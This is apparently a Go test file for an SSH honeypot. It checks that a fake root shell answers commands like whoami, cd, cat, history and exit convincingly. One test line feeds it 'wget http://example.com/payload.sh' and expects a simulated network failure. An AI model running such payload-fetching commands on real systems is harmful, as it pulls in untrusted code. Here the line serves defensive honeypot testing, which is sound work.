package sshpot

import (
	"strings"
	"testing"
)

func TestFakeShellCommandsAndState(t *testing.T) {
	sh := NewFakeShell("root", "192.0.2.100")

	if got := sh.Prompt(); got != "root@prod-web-01:~# " {
		t.Fatalf("unexpected initial prompt: %q", got)
	}

	out, code, exit := sh.Execute("whoami && id")
	if code != 0 || exit || !strings.Contains(out, "root") || !strings.Contains(out, "uid=0(root)") {
		t.Fatalf("unexpected whoami && id result: out=%q code=%d exit=%v", out, code, exit)
	}

	out, code, _ = sh.Execute("cd /etc && pwd && cat hostname")
	if code != 0 || !strings.Contains(out, "/etc\nprod-web-01") {
		t.Fatalf("unexpected cd/pwd/cat result: out=%q code=%d", out, code)
	}

	out, code, _ = sh.Execute("cat /nonexistent")
	if code != 1 || !strings.Contains(out, "No such file or directory") {
		t.Fatalf("expected error on missing file, got out=%q code=%d", out, code)
	}

	out, code, _ = sh.Execute("unknown-binary")
	if code != 127 || !strings.Contains(out, "command not found") {
		t.Fatalf("expected 127 on unknown command, got out=%q code=%d", out, code)
	}

	out, code, _ = sh.Execute("history")
	if code != 0 || !strings.Contains(out, "whoami && id") || !strings.Contains(out, "unknown-binary") {
		t.Fatalf("expected commands in history, got %q", out)
	}

	out, code, _ = sh.Execute("wget http://example.com/payload.sh")
	if code == 0 || !strings.Contains(out, "Temporary failure in name resolution") {
		t.Fatalf("expected simulated network failure without real request, got out=%q code=%d", out, code)
	}

	_, code, exit = sh.Execute("exit")
	if !exit || code != 0 {
		t.Fatalf("expected exit=true, code=0, got exit=%v code=%d", exit, code)
	}
}
